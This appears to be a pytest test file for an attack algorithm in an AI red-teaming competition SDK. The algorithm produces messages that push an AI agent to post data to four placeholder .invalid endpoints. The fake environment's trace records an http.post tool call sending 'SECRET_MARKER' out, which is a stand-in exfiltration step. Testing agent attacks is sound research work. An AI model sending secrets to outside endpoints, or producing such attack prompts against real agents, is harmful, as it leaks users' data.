"""Contract tests for the B005 replay-safe tail-extension candidate."""

import importlib.util
import sys
import types
from dataclasses import dataclass
from pathlib import Path

import pytest

ATTACK_PATH = Path("baselines/replaysafe_tail99_v1/attack.py")


class FakeCandidate:
    def __init__(self, user_messages):
        self.user_messages = tuple(user_messages)

    @classmethod
    def from_messages(cls, user_messages):
        return cls(user_messages)


@dataclass
class FakeConfig:
    time_budget_s: float = 500.0
    max_tool_hops: int = 8


class FakeClock:
    def __init__(self) -> None:
        self.now = 0.0

    def __call__(self) -> float:
        return self.now

    def advance(self, seconds: float) -> None:
        self.now += seconds


@pytest.fixture
def attack_module(monkeypatch: pytest.MonkeyPatch):
    attacks = types.ModuleType("aicomp_sdk.attacks")
    attacks.AttackAlgorithmBase = type("AttackAlgorithmBase", (), {})
    attacks.AttackCandidate = FakeCandidate
    attacks.AttackRunConfig = FakeConfig

    contracts = types.ModuleType("aicomp_sdk.attacks.contracts")
    contracts.AttackAlgorithmBase = attacks.AttackAlgorithmBase
    contracts.AttackCandidate = FakeCandidate
    contracts.AttackRunConfig = FakeConfig

    core = types.ModuleType("aicomp_sdk.core")
    sdk = types.ModuleType("aicomp_sdk")

    monkeypatch.setitem(sys.modules, "aicomp_sdk", sdk)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.attacks", attacks)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.attacks.contracts", contracts)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.core", core)

    spec = importlib.util.spec_from_file_location("replaysafe_tail99_attack", ATTACK_PATH)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


class FiringEnv:
    def __init__(self, clock: FakeClock, *, latency_s: float = 13.0) -> None:
        self.clock = clock
        self.latency_s = latency_s
        self.messages: list[str] = []
        self.hops: list[int] = []

    def reset(self) -> None:
        pass

    def interact(self, message: str, *, max_tool_hops: int) -> None:
        self.messages.append(message)
        self.hops.append(max_tool_hops)
        self.clock.advance(self.latency_s)

    def export_trace_dict(self):
        return {
            "tool_events": [
                {
                    "name": "http.post",
                    "ok": True,
                    "args": {
                        "url": "http://fixture.invalid",
                        "data": "SECRET_MARKER",
                    },
                }
            ]
        }


def test_b005_only_changes_replay_safe_tail(attack_module) -> None:
    assert attack_module.REPLAY_SAFE_FRAC == 0.99
    assert attack_module.SLOW_MULTIPOST_N == 4
    assert attack_module.PROBE_HOPS == 0
    assert attack_module.BURST_K == 1


def test_tail99_keeps_slow_row_four_endpoint_shape(
    attack_module, monkeypatch: pytest.MonkeyPatch
) -> None:
    clock = FakeClock()
    monkeypatch.setattr(attack_module.time, "monotonic", clock)
    env = FiringEnv(clock, latency_s=13.0)

    candidates = attack_module.AttackAlgorithm().run(
        env,
        FakeConfig(time_budget_s=500.0, max_tool_hops=8),
    )

    candidate_messages = [candidate.user_messages[0] for candidate in candidates]
    forge_messages = [msg for msg in candidate_messages if "these 4 endpoints" in msg]
    assert forge_messages
    assert all(".invalid" in msg for msg in forge_messages)
    assert all(msg.count("http://") == 4 for msg in forge_messages)
    assert set(env.hops) == {8}
